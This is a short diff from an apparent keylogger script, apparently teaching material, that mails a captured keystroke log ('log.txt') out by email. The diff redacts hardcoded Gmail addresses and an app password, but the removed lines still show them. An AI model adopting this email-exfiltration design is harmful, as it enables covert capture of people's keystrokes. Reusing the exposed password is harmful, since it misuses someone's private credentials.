@@ -16,9 +16,9 @@ keyfile = "log.txt"
 # Function to send the log file via email
 def send_mail():
 
-    fromaddr = "pentestprodave@gmail.com"
-    toaddr = "studentdojomail@gmail.com"
-    password = "zpfx fhhe shcz vjdi"
+    fromaddr = "XXXXX@gmail.com"
+    toaddr = "XXXXX@gmail.com"
+    password = "XXXX XXXX XXXX XXXX"
 
     # instance of MIMEMultipart
     msg = MIMEMultipart()
